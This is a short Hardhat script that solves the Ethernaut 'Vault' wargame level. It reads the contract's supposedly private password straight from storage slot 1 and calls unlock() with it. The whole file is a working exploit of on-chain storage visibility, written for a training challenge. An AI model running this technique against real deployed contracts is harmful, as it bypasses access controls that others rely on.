const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async (provider) => {
    
    //PLACE ADDRESS OF VAULT CONTRACT HERE (Ethernaut: contract.address)
    const contractAddr = "0x00B1b7E8E19f739EDA1081250a834F8E60E8687b";     
    
    //get contract 
    const contract = await ethers.getContractAt("Vault", contractAddr);
    
    console.log("* * * ");
    console.log(`contract is ${(await contract.locked()) ? "LOCKED" : "UNLOCKED" }`); 
    
    //get password 
    const passwdRaw  = await provider.getStorageAt(contract.address, 1); 
    console.log(`password is ${passwdRaw}`); 
    
    //unlock
    await contract.unlock(passwdRaw); 
    
    console.log(`contract is ${(await contract.locked()) ? "LOCKED" : "UNLOCKED" }`); 
    
    console.log("* * * ");
});
